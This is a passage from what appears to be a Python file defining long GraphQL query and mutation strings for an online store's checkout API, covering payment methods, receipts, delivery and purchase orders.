orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}
"""

MUTATION_SUBMIT = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on 